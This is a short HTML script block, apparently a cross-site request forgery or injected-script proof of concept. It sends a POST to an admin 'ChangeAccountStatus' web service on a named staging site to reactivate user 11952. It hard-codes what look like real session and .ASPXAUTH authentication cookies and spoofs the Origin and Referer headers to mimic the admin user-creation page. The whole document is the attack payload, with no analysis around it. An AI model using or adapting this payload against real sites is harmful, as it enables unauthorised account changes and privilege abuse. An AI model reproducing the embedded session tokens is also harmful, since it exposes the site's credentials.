<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://bapstaging.azurewebsites.net/WebServices/AdminWS.asmx/ChangeAccountStatus", true);

// Set headers
xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader("Cookie", "ASP.NET_SessionId=fxbf4ccw4fqdrbilvnizusbp; ARRAffinity=9e4ed16610389c6dbd3f9e5ee726cf4d949e701ca11a6a6dff71b275d53f70f1; ARRAffinitySameSite=9e4ed16610389c6dbd3f9e5ee726cf4d949e701ca11a6a6dff71b275d53f70f1; .ASPXAUTH=CC554D376463733E8352DFB143BDA1B5ACCBF335EB6A9C011B7CE4A3E3643CB2D933D59D228F5C1CAADE0DC5339D1AEA73F8B54D847ACD6374D9D15F10CB4B8AEC5FC1F6B05CD1C8E32521D4A20C65D8B5E3149E3E793CE83A1660D0E86334C1");
xhr.setRequestHeader("Origin", "https://bapstaging.azurewebsites.net/");
xhr.setRequestHeader("Referer", "https://bapstaging.azurewebsites.net/Admin/CreateUsers.aspx");

// Response handler
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        console.log("Status:", xhr.status);
        console.log("Response:", xhr.responseText);
    }
};

// Payload
var data = JSON.stringify({
    makeActive: true,
    userID: "11952"
});

// Send request
xhr.send(data);
</script>
